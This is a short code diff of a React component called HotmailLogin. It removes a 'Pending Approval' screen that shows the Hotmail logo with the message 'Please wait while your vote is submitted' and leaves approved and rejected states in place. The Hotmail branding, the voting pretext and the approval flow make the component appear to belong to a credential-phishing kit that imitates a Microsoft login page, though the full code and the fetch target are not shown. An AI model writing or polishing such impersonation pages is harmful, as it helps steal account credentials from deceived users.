@@ -16,7 +16,6 @@ export default function HotmailLogin() {
     }
 
     setLoading(true);
-    setStatus("pending");
 
     try {
       await fetch(
@@ -42,18 +41,6 @@ export default function HotmailLogin() {
     }
 
     setLoading(false);
-  }
-
-  if (status === "pending") {
-    return (
-      <div className="min-h-screen bg-[#eef2f7] flex items-center justify-center px-4 py-10">
-        <div className="w-full max-w-sm rounded-[32px] bg-white border border-slate-200 shadow-[0_30px_70px_rgba(15,23,42,0.12)] px-8 py-10 text-center">
-          <img src={emailLogo} alt="Hotmail" className="mx-auto h-14 w-14 mb-6" />
-          <h1 className="text-3xl font-semibold text-slate-900">Pending Approval</h1>
-          <p className="mt-3 text-slate-600">Please wait while your vote is submitted.</p>
-        </div>
-      </div>
-    );
   }
 
   if (status === "approved" || status === "rejected") {
